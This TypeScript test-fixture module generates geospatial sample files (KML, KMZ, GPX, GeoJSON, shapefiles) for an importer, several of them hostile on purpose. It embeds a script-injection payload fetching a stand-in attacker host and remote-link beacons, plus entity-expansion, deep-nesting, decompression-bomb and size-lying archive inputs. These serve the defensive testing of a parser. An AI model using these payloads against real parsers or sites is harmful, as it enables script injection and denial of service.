import { strToU8, type Zippable, zipSync, zlibSync } from "fflate";

export const utf8 = (text: string) => Uint8Array.from(strToU8(text));

export function zip(files: Record<string, Uint8Array | string>, level: 0 | 9 = 9) {
  const entries: Zippable = {};
  for (const [name, data] of Object.entries(files))
    entries[name] = [
      typeof data === "string" ? utf8(data) : Uint8Array.from(data),
      { level, mtime: new Date(2024, 0, 1, 12, 0, 0) },
    ];
  return zipSync(entries);
}

export function deflatedZeros(megabytes: number): Uint8Array {
  const repeats = Math.ceil((megabytes * 1024 * 1024 - 1) / 258);
  const out = new Uint8Array(Math.ceil((3 + 8 + repeats * 13 + 7) / 8));
  const set = (bit: number) => {
    out[bit >> 3] |= 1 << (bit & 7);
  };
  for (const bit of [0, 1, 5, 6]) set(bit);
  for (let at = 0; at < repeats; at++)
    for (const bit of [0, 1, 5, 7]) set(11 + at * 13 + bit);
  return out;
}

export function lyingArchive(
  name: string,
  packed: Uint8Array,
  declared: number,
): Uint8Array {
  const named = utf8(name);
  const local = new Uint8Array(30 + named.length);
  const localView = new DataView(local.buffer);
  localView.setUint32(0, 0x04034b50, true);
  localView.setUint16(4, 20, true);
  localView.setUint16(8, 8, true);
  localView.setUint32(18, packed.length, true);
  localView.setUint32(22, declared, true);
  localView.setUint16(26, named.length, true);
  local.set(named, 30);
  const entry = new Uint8Array(46 + named.length);
  const entryView = new DataView(entry.buffer);
  entryView.setUint32(0, 0x02014b50, true);
  entryView.setUint16(4, 20, true);
  entryView.setUint16(6, 20, true);
  entryView.setUint16(10, 8, true);
  entryView.setUint32(20, packed.length, true);
  entryView.setUint32(24, declared, true);
  entryView.setUint16(28, named.length, true);
  entry.set(named, 46);
  const end = new Uint8Array(22);
  const endView = new DataView(end.buffer);
  endView.setUint32(0, 0x06054b50, true);
  endView.setUint16(8, 1, true);
  endView.setUint16(10, 1, true);
  endView.setUint32(12, entry.length, true);
  endView.setUint32(16, local.length + packed.length, true);
  return concat([local, packed, entry, end]);
}

function crc32(bytes: Uint8Array): number {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit++) crc = (crc >>> 1) ^ (crc & 1 ? 0xedb88320 : 0);
  }
  return (crc ^ 0xffffffff) >>> 0;
}

function concat(parts: Uint8Array[]): Uint8Array {
  const out = new Uint8Array(parts.reduce((sum, part) => sum + part.length, 0));
  let at = 0;
  for (const part of parts) {
    out.set(part, at);
    at += part.length;
  }
  return out;
}

export function png(width: number, height: number, rows = height): Uint8Array {
  const chunk = (type: string, data: Uint8Array) => {
    const body = concat([utf8(type), data]);
    const out = new Uint8Array(body.length + 8);
    const view = new DataView(out.buffer);
    view.setUint32(0, data.length);
    out.set(body, 4);
    view.setUint32(body.length + 4, crc32(body));
    return out;
  };
  const header = new Uint8Array(13);
  const view = new DataView(header.buffer);
  view.setUint32(0, width);
  view.setUint32(4, height);
  header.set([8, 2, 0, 0, 0], 8);
  const pixels = new Uint8Array(rows * (1 + width * 3));
  for (let y = 0; y < rows; y++)
    for (let x = 0; x < width; x++) {
      const at = y * (1 + width * 3) + 1 + x * 3;
      pixels[at] = (x * 4) & 0xff;
      pixels[at + 1] = (y * 4) & 0xff;
      pixels[at + 2] = 128;
    }
  return concat([
    Uint8Array.of(0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a),
    chunk("IHDR", header),
    chunk("IDAT", zlibSync(pixels, { level: 9 })),
    chunk("IEND", new Uint8Array(0)),
  ]);
}

export function jpegHeader(width: number, height: number): Uint8Array {
  const app0 = [
    0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0,
  ];
  const frame = [
    0xff,
    0xc0,
    0,
    11,
    8,
    height >> 8,
    height & 255,
    width >> 8,
    width & 255,
    1,
    1,
    0x11,
    0,
  ];
  return Uint8Array.from([0xff, 0xd8, ...app0, ...frame, 0xff, 0xd9]);
}

export function webpHeader(width: number, height: number): Uint8Array {
  const out = new Uint8Array(32);
  out.set(utf8("RIFF"), 0);
  new DataView(out.buffer).setUint32(4, 24, true);
  out.set(utf8("WEBPVP8L"), 8);
  new DataView(out.buffer).setUint32(16, 12, true);
  out[20] = 0x2f;
  new DataView(out.buffer).setUint32(21, (width - 1) | ((height - 1) << 14), true);
  return out;
}

export type Xy = [number, number];

export type ShpRecord =
  | { kind: "null" }
  | { kind: "point"; at: Xy }
  | { kind: "multipoint"; points: Xy[] }
  | { kind: "polyline" | "polygon"; parts: Xy[][] };

const SHP_TYPE = { null: 0, point: 1, polyline: 3, polygon: 5, multipoint: 8 } as const;

export function shpContent(record: ShpRecord): Uint8Array {
  if (record.kind === "null") {
    return new Uint8Array(4);
  }
  if (record.kind === "point") {
    const out = new Uint8Array(20);
    const view = new DataView(out.buffer);
    view.setInt32(0, 1, true);
    view.setFloat64(4, record.at[0], true);
    view.setFloat64(12, record.at[1], true);
    return out;
  }
  const points = record.kind === "multipoint" ? record.points : record.parts.flat();
  const parts = record.kind === "multipoint" ? [] : record.parts;
  const head = record.kind === "multipoint" ? 40 : 44 + parts.length * 4;
  const out = new Uint8Array(head + points.length * 16);
  const view = new DataView(out.buffer);
  view.setInt32(0, SHP_TYPE[record.kind], true);
  const xs = points.map((point) => point[0]);
  const ys = points.map((point) => point[1]);
  const box = points.length
    ? [Math.min(...xs), Math.min(...ys), Math.max(...xs), Math.max(...ys)]
    : [0, 0, 0, 0];
  box.forEach((value, index) => {
    view.setFloat64(4 + index * 8, value, true);
  });
  if (record.kind === "multipoint") view.setInt32(36, points.length, true);
  else {
    view.setInt32(36, parts.length, true);
    view.setInt32(40, points.length, true);
    let start = 0;
    parts.forEach((part, index) => {
      view.setInt32(44 + index * 4, start, true);
      start += part.length;
    });
  }
  points.forEach((point, index) => {
    view.setFloat64(head + index * 16, point[0], true);
    view.setFloat64(head + index * 16 + 8, point[1], true);
  });
  return out;
}

export function shpFrom(contents: Uint8Array[], shapeType: number): Uint8Array {
  const length = 100 + contents.reduce((sum, content) => sum + 8 + content.length, 0);
  const out = new Uint8Array(length);
  const view = new DataView(out.buffer);
  view.setInt32(0, 9994);
  view.setInt32(24, length / 2);
  view.setInt32(28, 1000, true);
  view.setInt32(32, shapeType, true);
  let at = 100;
  contents.forEach((content, index) => {
    view.setInt32(at, index + 1);
    view.setInt32(at + 4, content.length / 2);
    out.set(content, at + 8);
    at += 8 + content.length;
  });
  return out;
}

export function shp(records: ShpRecord[]): Uint8Array {
  const first = records.find((record) => record.kind !== "null");
  return shpFrom(records.map(shpContent), first ? SHP_TYPE[first.kind] : 0);
}

export interface DbfColumn {
  name: string;
  type: "C" | "N" | "F" | "L" | "D" | "M";
  length: number;
  decimals?: number;
}

export function windows1252(text: string): Uint8Array {
  const high: Record<string, number> = { "€": 0x80, Œ: 0x8c, œ: 0x9c, "’": 0x92 };
  return Uint8Array.from(Array.from(text), (char) => high[char] ?? char.charCodeAt(0));
}

export function dbf(
  columns: DbfColumn[],
  rows: (string | null)[][],
  options: {
    encode?: (text: string) => Uint8Array;
    languageDriver?: number;
    deleted?: number[];
  } = {},
): Uint8Array {
  const encode = options.encode ?? utf8;
  const headerLength = 32 + columns.length * 32 + 1;
  const recordLength = 1 + columns.reduce((sum, column) => sum + column.length, 0);
  const out = new Uint8Array(headerLength + rows.length * recordLength + 1);
  const view = new DataView(out.buffer);
  out.set([0x03, 124, 1, 1], 0);
  view.setUint32(4, rows.length, true);
  view.setUint16(8, headerLength, true);
  view.setUint16(10, recordLength, true);
  out[29] = options.languageDriver ?? 0;
  columns.forEach((column, index) => {
    const at = 32 + index * 32;
    out.set(utf8(column.name).subarray(0, 10), at);
    out[at + 11] = column.type.charCodeAt(0);
    out[at + 16] = column.length;
    out[at + 17] = column.decimals ?? 0;
  });
  out[headerLength - 1] = 0x0d;
  rows.forEach((row, index) => {
    let at = headerLength + index * recordLength;
    out[at++] = options.deleted?.includes(index) ? 0x2a : 0x20;
    columns.forEach((column, position) => {
      const cell = out.subarray(at, at + column.length).fill(0x20);
      const bytes = encode(row[position] ?? "").subarray(0, column.length);
      cell.set(
        bytes,
        column.type === "N" || column.type === "F" ? column.length - bytes.length : 0,
      );
      at += column.length;
    });
  });
  out[out.length - 1] = 0x1a;
  return out;
}

export const PRJ = {
  wgs84:
    'GEOGCS["GCS_WGS_1984",DATUM["D_WGS_1984",SPHEROID["WGS_1984",6378137.0,298.257223563]],PRIMEM["Greenwich",0.0],UNIT["Degree",0.0174532925199433]]',
  nad83:
    'GEOGCS["GCS_North_American_1983",DATUM["D_North_American_1983",SPHEROID["GRS_1980",6378137.0,298.257222101]],PRIMEM["Greenwich",0.0],UNIT["Degree",0.0174532925199433]]',
  etrs89:
    'GEOGCS["GCS_ETRS_1989",DATUM["D_ETRS_1989",SPHEROID["GRS_1980",6378137.0,298.257222101]],PRIMEM["Greenwich",0.0],UNIT["Degree",0.0174532925199433]]',
  webMercator:
    'PROJCS["WGS_1984_Web_Mercator_Auxiliary_Sphere",GEOGCS["GCS_WGS_1984",DATUM["D_WGS_1984",SPHEROID["WGS_1984",6378137.0,298.257223563]],PRIMEM["Greenwich",0.0],UNIT["Degree",0.0174532925199433]],PROJECTION["Mercator_Auxiliary_Sphere"],PARAMETER["False_Easting",0.0],PARAMETER["False_Northing",0.0],PARAMETER["Central_Meridian",0.0],PARAMETER["Standard_Parallel_1",0.0],PARAMETER["Auxiliary_Sphere_Type",0.0],UNIT["Meter",1.0]]',
  epsg3857:
    'PROJCS["WGS 84 / Pseudo-Mercator",GEOGCS["WGS 84",DATUM["WGS_1984",SPHEROID["WGS 84",6378137,298.257223563]],PRIMEM["Greenwich",0],UNIT["degree",0.0174532925199433]],PROJECTION["Mercator_1SP"],UNIT["metre",1],AUTHORITY["EPSG","3857"]]',
  statePlane:
    'PROJCS["NAD_1983_StatePlane_New_York_Long_Island_FIPS_3104_Feet",GEOGCS["GCS_North_American_1983",DATUM["D_North_American_1983",SPHEROID["GRS_1980",6378137.0,298.257222101]],PRIMEM["Greenwich",0.0],UNIT["Degree",0.0174532925199433]],PROJECTION["Lambert_Conformal_Conic"],PARAMETER["False_Easting",984250.0],PARAMETER["False_Northing",0.0],PARAMETER["Central_Meridian",-74.0],PARAMETER["Standard_Parallel_1",40.66666666666666],PARAMETER["Standard_Parallel_2",41.03333333333333],PARAMETER["Latitude_Of_Origin",40.16666666666666],UNIT["Foot_US",0.3048006096012192]]',
} as const;

export const toWebMercator = ([lon, lat]: Xy): Xy => {
  const x = (lon * Math.PI * 6378137) / 180;
  const y = Math.log(Math.tan(Math.PI / 4 + (lat * Math.PI) / 360)) * 6378137;
  return [Math.round(x * 100) / 100, Math.round(y * 100) / 100];
};

const CITIES: { name: string; at: Xy; population: string; founded: string }[] = [
  {
    name: "New York",
    at: [-74.006, 40.7128],
    population: "8336817",
    founded: "16240101",
  },
  {
    name: "Chicago",
    at: [-87.6298, 41.8781],
    population: "2746388",
    founded: "18330812",
  },
  {
    name: "Denver",
    at: [-104.9903, 39.7392],
    population: "715522",
    founded: "18581122",
  },
];

const CITY_COLUMNS: DbfColumn[] = [
  { name: "NAME", type: "C", length: 24 },
  { name: "POP", type: "N", length: 10 },
  { name: "AREA_KM2", type: "F", length: 12, decimals: 2 },
  { name: "CAPITAL", type: "L", length: 1 },
  { name: "FOUNDED", type: "D", length: 8 },
];

const cityRows = () =>
  CITIES.map((city, index) => [
    city.name,
    city.population,
    ["783.80", "606.10", "401.20"][index],
    index === 2 ? "T" : "F",
    city.founded,
  ]);

const cityPoints = (project: (at: Xy) => Xy = (at) => at): ShpRecord[] =>
  CITIES.map((city) => ({ kind: "point", at: project(city.at) }));

export const squareCw = (west: number, south: number, size: number): Xy[] => [
  [west, south],
  [west, south + size],
  [west + size, south + size],
  [west + size, south],
  [west, south],
];

export const squareCcw = (west: number, south: number, size: number): Xy[] =>
  [...squareCw(west, south, size)].reverse();

const ATTACKER = "https://attacker.example";

export const SAMPLE_KML = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2" xmlns:gx="http://www.google.com/kml/ext/2.2">
<Document>
  <name>Field survey</name>
  <Schema name="Site" id="SiteId">
    <SimpleField type="string" name="code"><displayName>Code</displayName></SimpleField>
    <SimpleField type="int" name="visits"/>
    <SimpleField type="double" name="score"/>
    <SimpleField type="bool" name="open"/>
  </Schema>
  <Style id="red"><IconStyle><color>ff0000ff</color><Icon><href>${ATTACKER}/pin.png</href></Icon></IconStyle></Style>
  <Style id="trail"><LineStyle><color>ff00aa00</color><width>3</width></LineStyle></Style>
  <Style id="zone"><LineStyle><color>ffff0000</color><width>2</width></LineStyle><PolyStyle><color>800000ff</color></PolyStyle></Style>
  <Style id="zoneHover"><LineStyle><color>ffffffff</color><width>9</width></LineStyle></Style>
  <StyleMap id="zoneMap">
    <Pair><key>highlight</key><styleUrl>#zoneHover</styleUrl></Pair>
    <Pair><key>normal</key><styleUrl>#zone</styleUrl></Pair>
  </StyleMap>
  <Folder>
    <name>Sites</name>
    <Placemark>
      <name>Depot &amp; yard</name>
      <description><![CDATA[<p>Open <b>daily</b>.</p><img src="${ATTACKER}/beacon.png"><script>fetch("${ATTACKER}")</script> See <a href="${ATTACKER}/go">the site</a>]]></description>
      <styleUrl>#red</styleUrl>
      <TimeStamp><when>2024-05-01T09:30:00Z</when></TimeStamp>
      <ExtendedData>
        <Data name="rate"><value>4.1</value></Data>
        <Data name="postcode"><value>02134</value></Data>
        <Data name="site"><value>${ATTACKER}/data</value></Data>
        <SchemaData schemaUrl="#SiteId">
          <SimpleData name="code">0042</SimpleData>
          <SimpleData name="visits">17</SimpleData>
          <SimpleData name="score">8.5</SimpleData>
          <SimpleData name="open">1</SimpleData>
        </SchemaData>
      </ExtendedData>
      <Point><coordinates>-77.0459,38.8929,12</coordinates></Point>
    </Placemark>
    <Folder>
      <name>Routes</name>
      <Placemark>
        <name>Trail</name>
        <styleUrl>#trail</styleUrl>
        <TimeSpan><begin>2024-05-01</begin><end>2024-05-03</end></TimeSpan>
        <LineString><coordinates>-77.05,38.89,0 -77.04,38.9,0 -77.03,38.905,0</coordinates></LineString>
      </Placemark>
      <Placemark>
        <name>Drive</name>
        <gx:Track>
          <when>2024-05-02T10:00:00Z</when><when>2024-05-02T10:05:00Z</when><when>2024-05-02T10:10:00Z</when>
          <gx:coord>-77.06 38.88 5</gx:coord><gx:coord>-77.055 38.885 6</gx:coord><gx:coord>-77.05 38.89 7</gx:coord>
        </gx:Track>
      </Placemark>
    </Folder>
  </Folder>
  <Folder>
    <name>Zones</name>
    <Placemark>
      <name>Zone A</name>
      <styleUrl>#zoneMap</styleUrl>
      <Polygon>
        <innerBoundaryIs><LinearRing><coordinates>-77.04,38.9 -77.03,38.9 -77.03,38.91 -77.04,38.9</coordinates></LinearRing></innerBoundaryIs>
        <outerBoundaryIs><LinearRing><coordinates>-77.06,38.88 -77.02,38.88 -77.02,38.92 -77.06,38.92 -77.06,38.88</coordinates></LinearRing></outerBoundaryIs>
      </Polygon>
    </Placemark>
    <Placemark>
      <name>Mixed</name>
      <Style><LineStyle><color>ff112233</color></LineStyle></Style>
      <MultiGeometry>
        <Point><coordinates>-77.1,38.8</coordinates></Point>
        <Point><coordinates>-77.2,38.7</coordinates></Point>
        <LineString><coordinates>-77.1,38.8 -77.2,38.7</coordinates></LineString>
        <MultiGeometry><Polygon><outerBoundaryIs><LinearRing><coordinates>-77.3,38.6 -77.2,38.6 -77.2,38.7 -77.3,38.6</coordinates></LinearRing></outerBoundaryIs></Polygon></MultiGeometry>
      </MultiGeometry>
    </Placemark>
  </Folder>
  <GroundOverlay>
    <name>Survey photo</name>
    <Icon><href>files/photo.png</href></Icon>
    <LatLonBox><north>38.92</north><south>38.88</south><east>-77.02</east><west>-77.06</west><rotation>30</rotation></LatLonBox>
  </GroundOverlay>
  <GroundOverlay>
    <name>Remote photo</name>
    <Icon><href>${ATTACKER}/overlay.png</href></Icon>
    <LatLonBox><north>39</north><south>38</south><east>-77</east><west>-78</west></LatLonBox>
  </GroundOverlay>
  <NetworkLink><name>More</name><Link><href>${ATTACKER}/more.kml</href></Link></NetworkLink>
  <ScreenOverlay><name>Logo</name><Icon><href>${ATTACKER}/logo.png</href></Icon></ScreenOverlay>
</Document>
</kml>
`;

export const RAW_MARKUP_KML = `<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
<Document>
  <Placemark>
    <name>Parcel 12</name>
    <description>Owner: <b>Smith</b> since 1990<br>Zoned <i>R-2</i> &amp; taxed<br/>a &lt; b</description>
    <Point><coordinates>-77.0459,38.8929</coordinates></Point>
  </Placemark>
  <Placemark>
    <name>Parcel 13</name>
    <description><table><tr><td>Owner</td><td><kml:b>Jones</kml:b></td></tr></table><p>Vacant<!-- </description> --></description>
    <Point><coordinates>-77.05,38.9</coordinates></Point>
  </Placemark>
</Document>
</kml>
`;

export const SAMPLE_GPX = `<?xml version="1.0" encoding="UTF-8"?>
<gpx version="1.1" creator="fixture" xmlns="http://www.topografix.com/GPX/1/1">
  <metadata><name>Morning ride</name><link href="${ATTACKER}/ride"><text>Ride</text></link></metadata>
  <wpt lat="46.5197" lon="6.6323">
    <ele>495.5</ele><time>2024-06-01T07:00:00Z</time><name>Start</name><desc>Meet &lt;b&gt;here&lt;/b&gt;</desc><sym>Flag</sym>
  </wpt>
  <wpt lat="46.4312" lon="6.9107"><name>Finish</name></wpt>
  <rte>
    <name>Plan</name>
    <rtept lat="46.5197" lon="6.6323"/><rtept lat="46.4628" lon="6.8419"/><rtept lat="46.4312" lon="6.9107"/>
  </rte>
  <trk>
    <name>Recorded</name><type>cycling</type>
    <trkseg>
      <trkpt lat="46.5197" lon="6.6323"><ele>495</ele><time>2024-06-01T07:00:00Z</time></trkpt>
      <trkpt lat="46.5000" lon="6.7000"><ele>520</ele><time>2024-06-01T07:20:00Z</time></trkpt>
    </trkseg>
    <trkseg>
      <trkpt lat="46.4628" lon="6.8419"><ele>380</ele><time>2024-06-01T08:00:00Z</time></trkpt>
      <trkpt lat="46.4312" lon="6.9107"><ele>372</ele><time>2024-06-01T08:30:00Z</time></trkpt>
    </trkseg>
  </trk>
</gpx>
`;

const json = (value: unknown) => `${JSON.stringify(value, null, 1)}\n`;

const GEOJSON_COLLECTION = {
  type: "FeatureCollection",
  crs: { type: "name", properties: { name: "urn:ogc:def:crs:OGC:1.3:CRS84" } },
  features: [
    {
      type: "Feature",
      geometry: { type: "Point", coordinates: [2.3522, 48.8566, 35] },
      properties: {
        name: "Paris",
        population: 2161000,
        capital: true,
        since: "0508-01-01",
        tags: ["city", "capital"],
        meta: { source: "census", year: 2020 },
        website: `${ATTACKER}/paris`,
        "marker-color": "#C00",
        description: "The <b>capital</b> of France",
      },
    },
    {
      type: "Feature",
      geometry: {
        type: "LineString",
        coordinates: [
          [2.35, 48.85],
          [4.83, 45.76],
        ],
      },
      properties: { name: "Paris to Lyon", stroke: "#0055aa", "stroke-width": 4 },
    },
    {
      type: "Feature",
      geometry: {
        type: "Polygon",
        coordinates: [
          [
            [2, 48],
            [3, 48],
            [3, 49],
            [2, 49],
            [2, 48],
          ],
        ],
      },
      properties: {
        title: "Box",
        fill: "#ffcc00",
        "fill-opacity": 0.4,
        population: null,
      },
    },
    { type: "Feature", geometry: null, properties: { name: "Nowhere" } },
  ],
};

const GEOJSON_GEOMETRY_COLLECTION = {
  type: "Feature",
  properties: { name: "Campus" },
  geometry: {
    type: "GeometryCollection",
    geometries: [
      { type: "Point", coordinates: [10, 50] },
      {
        type: "GeometryCollection",
        geometries: [
          {
            type: "MultiPoint",
            coordinates: [
              [10.1, 50.1],
              [10.2, 50.2],
            ],
          },
        ],
      },
      {
        type: "MultiPolygon",
        coordinates: [
          [
            [
              [10, 50],
              [11, 50],
              [11, 51],
              [10, 50],
            ],
          ],
          [
            [
              [12, 50],
              [13, 50],
              [13, 51],
              [12, 50],
            ],
          ],
        ],
      },
    ],
  },
};

export function packedFixtures(
  read: (name: string) => Uint8Array,
): Record<string, Uint8Array> {
  return { "fed-districts.kmz": zip({ "doc.kml": read("fed-districts.kml") }) };
}

export function fixtures(): Record<string, Uint8Array> {
  const cities = dbf(CITY_COLUMNS, cityRows());
  const named = (names: string[]) =>
    dbf(
      [{ name: "NAME", type: "C", length: 16 }],
      names.map((name) => [name]),
    );
  return {
    "sample.kml": utf8(SAMPLE_KML),
    "raw-markup.kml": utf8(RAW_MARKUP_KML),
    "sample.kmz": zip({
      "doc.kml": SAMPLE_KML,
      "files/photo.png": png(64, 64),
      "files/unused.png": png(8, 8),
    }),
    "sample.gpx": utf8(SAMPLE_GPX),
    "collection.geojson": utf8(json(GEOJSON_COLLECTION)),
    "feature.geojson": utf8(json(GEOJSON_COLLECTION.features[1])),
    "geometry.geojson": utf8(json(GEOJSON_COLLECTION.features[2].geometry)),
    "geometry-collection.geojson": utf8(json(GEOJSON_GEOMETRY_COLLECTION)),
    "crs-3857.geojson": utf8(
      json({
        type: "FeatureCollection",
        crs: { type: "name", properties: { name: "urn:ogc:def:crs:EPSG::3857" } },
        features: [
          {
            type: "Feature",
            geometry: { type: "Point", coordinates: [261845.7, 6250564.3] },
            properties: {},
          },
        ],
      }),
    ),
    "shp-points-wgs84.zip": zip({
      "cities.shp": shp(cityPoints()),
      "cities.dbf": cities,
      "cities.prj": PRJ.wgs84,
      "cities.cpg": "UTF-8",
      "cities.shx": new Uint8Array(100),
      "readme.txt": "Cities",
    }),
    "shp-lines-wgs84.zip": zip({
      "data/roads.shp": shp([
        {
          kind: "polyline",
          parts: [
            [
              [-74, 40.7],
              [-75, 40.2],
              [-77, 38.9],
            ],
          ],
        },
        { kind: "null" },
        {
          kind: "polyline",
          parts: [
            [
              [-87.6, 41.9],
              [-90.2, 38.6],
            ],
            [
              [-93.3, 44.9],
              [-87.9, 43],
            ],
          ],
        },
      ]),
      "data/roads.dbf": named(["Northeast", "Nothing", "Midwest"]),
      "data/roads.prj": PRJ.nad83,
    }),
    "shp-polygon-holes-wgs84.zip": zip({
      "park.shp": shp([
        {
          kind: "polygon",
          parts: [squareCw(0, 0, 10), squareCcw(2, 2, 2), squareCcw(6, 6, 2)],
        },
      ]),
      "park.dbf": named(["Park"]),
      "park.prj": PRJ.wgs84,
    }),
    "shp-multipolygon-wgs84.zip": zip({
      "islands.shp": shp([
        {
          kind: "polygon",
          parts: [
            squareCcw(1, 1, 8),
            squareCw(0, 0, 10),
            squareCw(20, 0, 5),
            squareCw(3, 3, 2),
            squareCcw(21, 1, 1),
          ],
        },
      ]),
      "islands.dbf": named(["Islands"]),
      "islands.prj": PRJ.wgs84,
    }),
    "shp-points-webmercator.zip": zip({
      "cities.shp": shp(cityPoints(toWebMercator)),
      "cities.dbf": cities,
      "cities.prj": PRJ.webMercator,
    }),
    "shp-points-stateplane.zip": zip({
      "cities.shp": shp([{ kind: "point", at: [987654.3, 212345.6] }]),
      "cities.dbf": named(["Somewhere"]),
      "cities.prj": PRJ.statePlane,
    }),
    "shp-points-noprj.zip": zip({
      "cities.shp": shp(cityPoints()),
      "cities.dbf": cities,
    }),
    "shp-points-cp1252.zip": zip({
      "cafes.shp": shp([
        { kind: "point", at: [2.35, 48.85] },
        { kind: "point", at: [8.54, 47.37] },
      ]),
      "cafes.dbf": dbf(
        [
          { name: "NAME", type: "C", length: 20 },
          { name: "PRICE", type: "C", length: 8 },
        ],
        [
          ["Café Œillet", "5 €"],
          ["Zürich Süd", "7 €"],
        ],
        { encode: windows1252 },
      ),
      "cafes.prj": PRJ.wgs84,
      "cafes.cpg": "1252",
    }),
    "shp-two-layers.zip": zip({
      "a/cities.shp": shp(cityPoints()),
      "a/cities.dbf": cities,
      "a/cities.prj": PRJ.wgs84,
      "b/park.shp": shp([{ kind: "polygon", parts: [squareCw(0, 0, 10)] }]),
      "b/park.dbf": named(["Park"]),
      "b/park.prj": PRJ.statePlane,
    }),
    "hostile-doctype.kml": utf8(
      `<?xml version="1.0"?><!DOCTYPE kml [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">]><kml><Placemark><name>&c;</name><Point><coordinates>0,0</coordinates></Point></Placemark></kml>`,
    ),
    "hostile-deep.kml": utf8(
      `<kml>${"<Folder>".repeat(500)}<Placemark><Point><coordinates>0,0</coordinates></Point></Placemark>${"</Folder>".repeat(500)}</kml>`,
    ),
    "hostile-bomb.kmz": zip({ "doc.kml": new Uint8Array(4 * 1024 * 1024).fill(0x20) }),
    "hostile-nested.zip": zip({ "inner.zip": zip({ "doc.kml": SAMPLE_KML }) }),
    "hostile-truncated-shp.zip": zip({
      "cut.shp": shp(cityPoints()).subarray(0, 150),
      "cut.dbf": cities,
      "cut.prj": PRJ.wgs84,
    }),
    "hostile-lying-dbf.zip": zip({
      "lie.shp": shp(cityPoints()),
      "lie.dbf": lyingDbf(cities, 4_000_000_000),
      "lie.prj": PRJ.wgs84,
    }),
  };
}

export function lyingDbf(table: Uint8Array, records: number): Uint8Array {
  const out = Uint8Array.from(table);
  new DataView(out.buffer).setUint32(4, records, true);
  return out;
}
